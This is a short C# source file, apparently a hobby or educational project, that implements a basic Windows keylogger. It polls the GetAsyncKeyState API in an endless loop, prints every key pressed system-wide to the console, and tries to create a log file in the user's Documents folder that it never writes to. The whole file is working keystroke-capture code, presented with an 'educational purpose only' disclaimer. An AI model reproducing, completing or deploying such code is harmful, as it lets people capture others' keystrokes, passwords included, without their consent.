/*
 * This program is made for educational purpose only.
 * This program was created on 2025-06-11 by Alexandre Gauvin.
 * 
 * Do not use this program for any malicious purposes
 * 
 */


using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

class KeyLogger
{
    [DllImport("User32.dll")]
    public static extern short GetAsyncKeyState(Int32 vKey);

    // Verify that the save file is present. if not create it.
    // return true if file ready. Return file if it was unable to create it .
    static bool file_creation()
    {

        string path =Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        try
        {
            StreamWriter outputFile = new StreamWriter(Path.Combine(path, "WriteLines.txt"));
            return true;
        }
        catch (Exception _)
        {
            Console.WriteLine("find what to do if it can not create the file");
            return false;
        };
        


    }

    static void Main()
    {

        if (file_creation())
        {
            Console.WriteLine("file created");
        }
        while (true)
        {
            Thread.Sleep(10); // it is in ms so we let 10 ms in between any key stroke, This could miss automated stroke 

            /*
             * i = 8 because 0x01=left mouse, 0x02 =  right mouse, 0x03 = cancel 0x04 = Middle mouse
             * we stop at 255 or 0xFF because these are all of the key of the keyboard. [8,255] are the key on the keyboard 
             */
            for (int i = 8; i < 255; i++)
            {

                short state = GetAsyncKeyState(i); // win api to know the key state of a specific key.
                bool is_down = (state & 0x8000) != 0; // Check if bit 15 is down
                bool was_pressed = (state & 0x001) != 0; // check if the key was press since last call

                if (was_pressed)
                {
                    Console.WriteLine((ConsoleKey)i);
                }
            }
        }
    }


    
}



